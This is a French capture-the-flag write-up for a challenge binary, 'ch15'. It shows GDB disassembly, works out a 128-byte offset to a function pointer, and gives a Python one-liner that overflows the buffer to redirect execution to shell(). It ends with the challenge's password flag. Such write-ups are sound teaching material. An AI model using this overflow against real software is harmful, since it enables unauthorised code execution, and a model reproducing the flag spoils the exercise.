(gdb) file ch15
Reading symbols from ch15...(no debugging symbols found)...done.
(gdb) p shell
$1 = {<text variable, no debug info>} 0x8048516 <shell>
(gdb) p sup
$2 = {<text variable, no debug info>} 0x8048559 <sup>

Dump of assembler code for function main:
   0x08048584 <+0>:     lea    0x4(%esp),%ecx
   0x08048588 <+4>:     and    $0xfffffff0,%esp
   0x0804858b <+7>:     pushl  -0x4(%ecx)
   0x0804858e <+10>:    push   %ebp
   0x0804858f <+11>:    mov    %esp,%ebp
   0x08048591 <+13>:    push   %ebx
   0x08048592 <+14>:    push   %ecx
   0x08048593 <+15>:    sub    $0x90,%esp
   0x08048599 <+21>:    call   0x80485de <__x86.get_pc_thunk.ax>
   0x0804859e <+26>:    add    $0x1a62,%eax

   0x080485a3 <+31>:    lea    -0x1aa7(%eax),%edx
   0x080485a9 <+37>:    mov    %edx,-0xc(%ebp)

   0x080485ac <+40>:    mov    -0x4(%eax),%edx
   0x080485b2 <+46>:    mov    (%edx),%edx
   0x080485b4 <+48>:    sub    $0x4,%esp
   0x080485b7 <+51>:    push   %edx

   0x080485b8 <+52>:    push   $0x85
   0x080485bd <+57>:    lea    -0x8c
   (%ebp),%edx
   0x080485c3 <+63>:    push   %edx
   0x080485c4 <+64>:    mov    %eax,%ebx

   0x080485c6 <+66>:    call   0x8048390 <fgets@plt>

   0x080485cb <+71>:    add    $0x10,%esp
   0x080485ce <+74>:    mov    -0xc(%ebp),%eax
   0x080485d1 <+77>:    call   *%eax
   0x080485d3 <+79>:    nop
   0x080485d4 <+80>:    lea    -0x8(%ebp),%esp
   0x080485d7 <+83>:    pop    %ecx
   0x080485d8 <+84>:    pop    %ebx

Donc func() est storé à %ebp - 0x0c et buffer à %ebp - 0x8c. 
Donc 0x8c - 0x0c = 0x80
Donc 8 * 16^1 + 0 * 16^0 = 128 + 0 = 128
L'offset est bien de 128 bytes

L'adresse de la fonction shell() étant : 0x08048516
On convertit en little-endian : \x16\x85\x04\x08
(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*128 + b"\x16\x85\x04\x08" + b"\n")'; cat) | ./ch15

Maintenat on peut cat .passwd

B33r1sSoG0oD4y0urBr4iN